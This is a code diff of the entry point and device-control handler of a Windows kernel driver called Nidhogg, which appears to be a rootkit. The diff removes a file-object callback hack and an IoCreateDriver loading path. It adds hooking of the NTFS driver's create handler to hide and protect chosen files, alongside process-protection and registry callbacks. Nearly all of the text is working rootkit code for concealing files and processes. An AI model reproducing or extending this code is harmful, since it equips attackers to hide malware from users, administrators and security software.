@@ -1,10 +1,9 @@
 #include "pch.h"
 #include "NidhoggUtils.h"
 
-NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
-	UNREFERENCED_PARAMETER(RegistryPath);
-
-	auto status = STATUS_SUCCESS;
+extern "C"
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
+	NTSTATUS status = STATUS_SUCCESS;
 	pGlobals.Init();
 	fGlobals.Init();
 	rGlobals.Init();
@@ -18,6 +17,11 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 
 	if (!Features.WriteData || !dimGlobals.PsGetProcessPeb)
 		Features.FunctionPatching = false;
+
+	if (!dimGlobals.ObReferenceObjectByName) {
+		Features.FileHiding = false;
+		Features.FileProtection = false;
+	}
 
 	// Setting up the device object.
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
@@ -42,26 +46,17 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 		return status;
 	}
 
-	// Enabling file callbacks.
-	POBJECT_TYPE_TEMP ObjectTypeTemp = (POBJECT_TYPE_TEMP)*IoFileObjectType;
-	ObjectTypeTemp->TypeInfo.SupportsObjectCallbacks = 1;
-
 	// Registering the process and file hooking function.
 	OB_OPERATION_REGISTRATION operations[] = {
 		{
 			PsProcessType,		// object type
 			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
 			OnPreOpenProcess, nullptr	// pre, post
-		},
-		{
-			IoFileObjectType,
-			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
-			OnPreFileOperation, nullptr
 		}
 	};
 	OB_CALLBACK_REGISTRATION registrationCallbacks = {
 		OB_FLT_REGISTRATION_VERSION,
-		2,				// operation count
+		1,				// operation count
 		RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),		// altitude
 		nullptr,		// context
 		operations
@@ -73,7 +68,6 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 		KdPrint((DRIVER_PREFIX "failed to register process and file callbacks: (0x%08X)\n", status));
 		status = STATUS_SUCCESS;
 		Features.ProcessProtection = false;
-		Features.FileProtection = false;
 	}
 
 	status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);
@@ -91,22 +85,6 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 
 	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
 	return status;
-}
-
-extern "C"
-NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
-	if (!DriverObject) {
-		UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"\\Driver\\Nidhogg");
-		UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
-		tIoCreateDriver IoCreateDriver = (tIoCreateDriver)MmGetSystemRoutineAddress(&routineName);
-
-		if (!IoCreateDriver)
-			return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
-
-		return IoCreateDriver(&driverName, &NidhoggEntry);
-	}
-
-	return NidhoggEntry(DriverObject, RegistryPath);
 }
 
 /*
@@ -438,6 +416,16 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
+
+			if (!fGlobals.Callbacks[0].Activated) {
+				status = InstallNtfsHook(IRP_MJ_CREATE);
+
+				if (!NT_SUCCESS(status)) {
+					RemoveFile(data);
+					KdPrint((DRIVER_PREFIX "Failed to hook ntfs.\n"));
+					break;
+				}
+			}
 			
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
@@ -477,6 +465,14 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		if (!RemoveFile(data)) {
 			status = STATUS_NOT_FOUND;
 			break;
+		}
+
+		if (fGlobals.Files.FilesCount == 0) {
+			status = UninstallNtfsHook(IRP_MJ_CREATE);
+
+			if (!NT_SUCCESS(status)) {
+				KdPrint((DRIVER_PREFIX "Failed to restore the hook.\n"));
+			}
 		}
 		break;
 	}
